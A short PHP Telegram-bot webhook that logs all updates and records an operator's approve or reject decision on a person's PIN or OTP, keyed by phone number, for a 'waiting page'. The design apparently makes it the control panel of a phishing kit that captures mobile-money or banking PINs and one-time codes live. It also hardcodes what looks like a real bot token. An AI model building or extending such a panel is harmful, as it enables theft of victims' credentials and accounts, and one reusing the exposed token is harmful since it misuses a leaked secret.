<?php
session_start();

$token = "8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8";

$update = json_decode(file_get_contents('php://input'), true);

// Log updates for debugging
file_put_contents("log.txt", date('Y-m-d H:i:s') . " | " . json_encode($update) . "\n", FILE_APPEND);

// Only handle button clicks
if(isset($update['callback_query'])) {
    $callback = $update['callback_query'];
    $data = $callback['data']; // e.g., approve_pin_0712345678 or reject_otp_0712345678
    $chatId = $callback['message']['chat']['id'];
    $messageId = $callback['message']['message_id'];
    $callbackId = $callback['id']; // for answerCallbackQuery

    $parts = explode('_', $data);
    if(count($parts) < 3) return; // invalid format

    $action = $parts[0]; // approve / reject
    $type   = $parts[1]; // pin / otp
    $phone  = $parts[2]; // phone number

    // Save status in session for waiting page
    $_SESSION['status'][$phone][$type] = $action;

    // Prepare Telegram message text
    $text = ($action == 'approve') ? "✅ " . strtoupper($type) . " Approved" : "❌ " . strtoupper($type) . " Rejected";
    $text = urlencode($text);

    // 1️⃣ Edit the original Telegram message
    file_get_contents("https://api.telegram.org/bot$token/editMessageText?chat_id=$chatId&message_id=$messageId&text=$text");

    // 2️⃣ Answer callback query to make button clickable instantly
    file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?callback_query_id=$callbackId&text=Action recorded&show_alert=false");

    exit();
}
?>